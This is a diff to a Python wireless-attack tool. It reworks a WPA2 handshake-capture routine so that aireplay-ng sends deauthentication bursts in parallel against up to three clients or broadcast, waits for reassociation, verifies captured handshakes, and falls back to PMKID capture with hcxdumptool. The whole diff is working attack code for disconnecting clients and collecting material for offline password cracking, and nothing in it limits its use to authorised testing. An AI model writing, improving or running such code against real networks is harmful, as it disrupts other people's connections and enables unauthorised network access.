@@ -416,26 +416,67 @@ def _save(cap_path: str, bssid: str) -> str:
     return dest
 
 
-# ─── aireplay-ng launcher with health monitoring ─────────────────────────────
+# ─── aireplay-ng deauth burst ─────────────────────────────────────────────────
+
+def _deauth_burst_parallel(
+    iface: str,
+    bssid: str,
+    client_macs: List[str],
+    count: int,
+) -> None:
+    """
+    Send exactly `count` deauth frames to each MAC in client_macs simultaneously,
+    then block until every burst process exits.
+    Pass an empty list for broadcast (FF:FF:FF:FF:FF:FF).
+    """
+    targets = client_macs if client_macs else [None]
+    procs: List[subprocess.Popen] = []
+
+    for mac in targets:
+        cmd = [
+            'aireplay-ng',
+            '--deauth', str(count),
+            '-a', bssid.upper(),
+            '-D',
+            '--ignore-negative-one',
+        ]
+        if mac:
+            cmd += ['-c', mac]
+        cmd.append(iface)
+        try:
+            proc = _popen(cmd)
+            procs.append(proc)
+            logger.debug("Deauth burst: target=%s client=%s count=%d",
+                         bssid, mac or "broadcast", count)
+        except Exception as exc:
+            logger.debug("Failed to start deauth burst: %s", exc)
+
+    burst_deadline = time.time() + max(30.0, count * 2.0)
+    for proc in procs:
+        remaining = max(1.0, burst_deadline - time.time())
+        try:
+            proc.wait(timeout=remaining)
+        except subprocess.TimeoutExpired:
+            _kill(proc)
+
 
 def _start_deauth(
     iface: str,
     bssid: str,
     client_mac: Optional[str] = None,
 ) -> subprocess.Popen:
-    """Start an infinite deauth process. Returns the Popen handle."""
+    """Infinite deauth — kept for backward-compat (test imports). Not used by capture_handshake."""
     cmd = [
         'aireplay-ng',
-        '--deauth', '0',          # INFINITE — until killed
+        '--deauth', '0',
         '-a', bssid.upper(),
-        '-D',                     # disable aireplay channel management
-        '--ignore-negative-one',  # skip "channel -1" errors
+        '-D',
+        '--ignore-negative-one',
     ]
     if client_mac:
         cmd += ['-c', client_mac]
     cmd.append(iface)
-
-    logger.info("Deauth start: target=%s client=%s", bssid, client_mac or "broadcast")
+    logger.info("Deauth start (infinite): target=%s client=%s", bssid, client_mac or "broadcast")
     return _popen(cmd)
 
 
@@ -571,27 +612,27 @@ def capture_handshake(
     channel: int,
     monitor_interface: str,
     timeout: int = 180,
+    deauth_count: int = 10,
 ) -> Optional[str]:
     """
     Capture a WPA2 handshake. Returns path to saved .cap file or None.
 
-    God-level architecture — superior to airgeddon:
+    Burst-and-wait architecture — sends deauth_count frames then goes quiet
+    so the client can reassociate (which triggers the handshake we capture).
 
-    1. Single absolute deadline governs all phases (no overflow bugs).
+    1. Single absolute deadline governs all phases.
     2. Channel verified before capture (iw dev readback).
     3. All subprocesses in dedicated process groups (no zombies).
     4. Adaptive airodump startup (poll, don't sleep).
-    5. Cap file growth monitored (detects stalled capture).
-    6. Dual verification: aircrack-ng + tshark (5% fewer false negatives).
-    7. Multi-client parallel deauth (all top clients simultaneously).
-    8. Handshake checked during scan phase (catches early arrivals).
-    9. aireplay-ng auto-restart on unexpected exit.
-    10. hcxdumptool version auto-detection for correct flag syntax.
+    5. Dual verification: aircrack-ng + tshark.
+    6. Parallel burst to all top clients simultaneously.
+    7. Handshake checked during scan phase (catches early arrivals).
+    8. hcxdumptool version auto-detection for correct flag syntax.
 
     Phase budget:
       Phase 1 — Client scan:       0%  →   8%   (~15 s)
-      Phase 2 — Targeted deauth:   8%  →  60%
-      Phase 3 — Broadcast deauth: 60%  →  78%
+      Phase 2 — Targeted deauth:   8%  →  60%   (burst → 5s quiet → check, repeat)
+      Phase 3 — Broadcast deauth: 60%  →  78%   (burst → 5s quiet → check, repeat)
       Phase 4 — PMKID capture:   78%  → 100%
     """
     iface = monitor_interface
@@ -603,8 +644,6 @@ def capture_handshake(
     phase2_end = start_time + int(timeout * 0.60)  # ~108s
     phase3_end = start_time + int(timeout * 0.78)  # ~140s
     # phase4 runs from phase3_end to absolute_deadline
-
-    CHECK_EVERY = 5  # seconds between handshake checks
 
     logger.info("=" * 60)
     logger.info("CAPTURE START: %s (%s) CH%d timeout=%ds", ssid, bssid, channel, timeout)
@@ -624,14 +663,10 @@ def capture_handshake(
     child_procs: list[subprocess.Popen] = []
 
     airodump_proc:  Optional[subprocess.Popen] = None
-    aireplay_procs: list[subprocess.Popen] = []  # multiple for parallel deauth
     scan_proc:      Optional[subprocess.Popen] = None
 
     def _cleanup_all():
         """Kill every child process we ever started."""
-        for p in aireplay_procs:
-            _kill(p)
-        aireplay_procs.clear()
         _kill(airodump_proc)
         _kill(scan_proc)
         for p in child_procs:
@@ -732,56 +767,33 @@ def capture_handshake(
             print('  [!] Warning: cap file not yet created')
 
         # ══════════════════════════════════════════════════════════════════
-        # Phase 2: Targeted deauth (multi-client parallel)
+        # Phase 2: Targeted deauth — burst-and-wait (allows reassociation)
         # ══════════════════════════════════════════════════════════════════
+        REASSOC_WAIT = 5  # seconds of quiet after each burst for client to reassociate
+
         if top_clients:
-            print(f'  [*] Phase 2: targeted deauth ({len(top_clients)} client(s))...')
-            logger.info("Phase 2: targeted deauth, %d client(s)", len(top_clients))
-
-            # Launch parallel deauth against ALL top clients simultaneously
-            # This is vastly more effective than one-at-a-time rotation
-            for client in top_clients[:3]:  # cap at 3 simultaneous
-                print(f'  [*] Deauthing {client.mac} ({client.signal_label})')
-                p = _start_deauth(iface, bssid, client.mac)
-                aireplay_procs.append(p)
-                child_procs.append(p)
+            target_macs = [c.mac for c in top_clients[:3]]
+            print(f'  [*] Phase 2: targeted deauth — {deauth_count} pkts/burst, '
+                  f'{REASSOC_WAIT}s reassoc window ({len(target_macs)} client(s))...')
+            logger.info("Phase 2: targeted deauth, %d client(s), %d pkts/burst",
+                        len(target_macs), deauth_count)
+            for mac in target_macs:
+                c = next(x for x in top_clients if x.mac == mac)
+                print(f'        {mac}  ({c.signal_label})')
         else:
-            print('  [*] Phase 2: broadcast deauth (no clients)...')
-            logger.info("Phase 2: broadcast deauth (no clients)")
-            p = _start_deauth(iface, bssid, None)
-            aireplay_procs.append(p)
-            child_procs.append(p)
+            target_macs = []
+            print(f'  [*] Phase 2: broadcast deauth — {deauth_count} pkts/burst, '
+                  f'{REASSOC_WAIT}s reassoc window...')
+            logger.info("Phase 2: broadcast deauth, %d pkts/burst", deauth_count)
 
-        # ── Phase 2 check loop ────────────────────────────────────────────
-        last_check = time.time()
-        last_cap_size = 0
-        stall_count = 0
-
+        burst_num = 0
         while time.time() < phase2_end and time.time() < absolute_deadline:
-            time.sleep(1)
-
-            # Health: restart dead aireplay processes
-            alive_procs = []
-            for p in aireplay_procs:
-                if _is_alive(p):
-                    alive_procs.append(p)
-                else:
-                    logger.warning("aireplay-ng (pid=%d) died — restarting", p.pid)
-            if len(alive_procs) < len(aireplay_procs):
-                # Restart dead ones
-                if top_clients:
-                    for client in top_clients[:3]:
-                        already = any(_is_alive(p) for p in alive_procs)
-                        if not already or len(alive_procs) < len(top_clients[:3]):
-                            p = _start_deauth(iface, bssid, client.mac)
-                            alive_procs.append(p)
-                            child_procs.append(p)
-                            break
-                else:
-                    p = _start_deauth(iface, bssid, None)
-                    alive_procs.append(p)
-                    child_procs.append(p)
-            aireplay_procs = alive_procs
+            burst_num += 1
+            elapsed = int(time.time() - start_time)
+            print(f'  [*] Burst #{burst_num} [{elapsed}s] — sending {deauth_count} deauth frames...',
+                  end=' ', flush=True)
+            _deauth_burst_parallel(iface, bssid, target_macs, deauth_count)
+            print('done.')
 
             # Health: check airodump is alive
             if not _is_alive(airodump_proc):
@@ -796,15 +808,44 @@ def capture_handshake(
                 ])
                 child_procs.append(airodump_proc)
 
-            # Health: check cap file is growing
-            current_size = _cap_size(cap_prefix)
-            if current_size == last_cap_size:
-                stall_count += 1
-                if stall_count >= 30:  # 30s stall
-                    logger.warning("Cap file stalled for 30s — restarting airodump")
-                    print('  [!] Capture stalled — restarting airodump...')
-                    _kill(airodump_proc)
-                    time.sleep(1)
+            # Reassociation window — poll every second for handshake
+            reassoc_end = min(time.time() + REASSOC_WAIT, phase2_end, absolute_deadline)
+            while time.time() < reassoc_end:
+                time.sleep(1)
+                cap = _find_cap(cap_prefix)
+                if cap:
+                    elapsed = int(time.time() - start_time)
+                    print(f'  [*] Checking [{elapsed}s]...', end=' ', flush=True)
+                    if _verify(cap, bssid, tmpdir):
+                        print('FOUND!')
+                        logger.info("Handshake FOUND in Phase 2 at %ds (burst #%d)",
+                                    elapsed, burst_num)
+                        _cleanup_all()
+                        return _save(cap, bssid)
+                    print('not yet')
+                    break  # one check per reassoc window; next burst will follow
+
+        # ══════════════════════════════════════════════════════════════════
+        # Phase 3: Broadcast deauth fallback — burst-and-wait
+        # ══════════════════════════════════════════════════════════════════
+        if time.time() < absolute_deadline:
+            remaining = int(phase3_end - time.time())
+            print(f'  [*] Phase 3: broadcast deauth fallback — {deauth_count} pkts/burst ({remaining}s)...')
+            logger.info("Phase 3: broadcast deauth, %d pkts/burst (%ds)", deauth_count, remaining)
+
+            burst_num = 0
+            while time.time() < phase3_end and time.time() < absolute_deadline:
+                burst_num += 1
+                elapsed = int(time.time() - start_time)
+                print(f'  [*] Broadcast burst #{burst_num} [{elapsed}s] — sending {deauth_count} frames...',
+                      end=' ', flush=True)
+                _deauth_burst_parallel(iface, bssid, [], deauth_count)
+                print('done.')
+
+                # Health: check airodump is alive
+                if not _is_alive(airodump_proc):
+                    logger.error("airodump-ng died during Phase 3!")
+                    print('  [!] airodump-ng crashed — restarting...')
                     airodump_proc = _popen([
                         'airodump-ng',
                         '-c', str(channel),
@@ -813,66 +854,22 @@ def capture_handshake(
                         iface,
                     ])
                     child_procs.append(airodump_proc)
-                    stall_count = 0
-            else:
-                stall_count = 0
-                last_cap_size = current_size
 
-            # Check for handshake
-            if time.time() - last_check >= CHECK_EVERY:
-                last_check = time.time()
-                cap = _find_cap(cap_prefix)
-                if cap:
-                    elapsed = int(time.time() - start_time)
-                    print(f'  [*] Checking [{elapsed}s]...', end=' ', flush=True)
-                    if _verify(cap, bssid, tmpdir):
-                        print('FOUND!')
-                        logger.info("Handshake FOUND in Phase 2 at %ds", elapsed)
-                        _cleanup_all()
-                        return _save(cap, bssid)
-                    print('not yet')
-
-        # ══════════════════════════════════════════════════════════════════
-        # Phase 3: Broadcast deauth fallback
-        # ══════════════════════════════════════════════════════════════════
-        if time.time() < absolute_deadline:
-            remaining = int(phase3_end - time.time())
-            print(f'  [*] Phase 3: broadcast deauth fallback ({remaining}s)...')
-            logger.info("Phase 3: broadcast deauth (%ds)", remaining)
-
-            # Kill targeted deauths, switch to broadcast
-            for p in aireplay_procs:
-                _kill(p)
-            aireplay_procs.clear()
-            time.sleep(0.5)
-
-            p = _start_deauth(iface, bssid, None)
-            aireplay_procs.append(p)
-            child_procs.append(p)
-
-            last_check = time.time()
-            while time.time() < phase3_end and time.time() < absolute_deadline:
-                time.sleep(1)
-
-                # Restart aireplay if it died
-                if not _is_alive(aireplay_procs[0]):
-                    logger.warning("broadcast aireplay died — restarting")
-                    p = _start_deauth(iface, bssid, None)
-                    aireplay_procs = [p]
-                    child_procs.append(p)
-
-                if time.time() - last_check >= CHECK_EVERY:
-                    last_check = time.time()
+                reassoc_end = min(time.time() + REASSOC_WAIT, phase3_end, absolute_deadline)
+                while time.time() < reassoc_end:
+                    time.sleep(1)
                     cap = _find_cap(cap_prefix)
                     if cap:
                         elapsed = int(time.time() - start_time)
                         print(f'  [*] Checking broadcast [{elapsed}s]...', end=' ', flush=True)
                         if _verify(cap, bssid, tmpdir):
                             print('FOUND!')
-                            logger.info("Handshake FOUND in Phase 3 at %ds", elapsed)
+                            logger.info("Handshake FOUND in Phase 3 at %ds (burst #%d)",
+                                        elapsed, burst_num)
                             _cleanup_all()
                             return _save(cap, bssid)
                         print('not yet')
+                        break
 
         # ══════════════════════════════════════════════════════════════════
         # Phase 4: PMKID via hcxdumptool
@@ -883,9 +880,6 @@ def capture_handshake(
             logger.info("Phase 4: PMKID (%ds)", pmkid_budget)
 
             # MUST kill airodump to release interface for hcxdumptool
-            for p in aireplay_procs:
-                _kill(p)
-            aireplay_procs.clear()
             _kill(airodump_proc)
             airodump_proc = None
             time.sleep(1)  # let interface settle
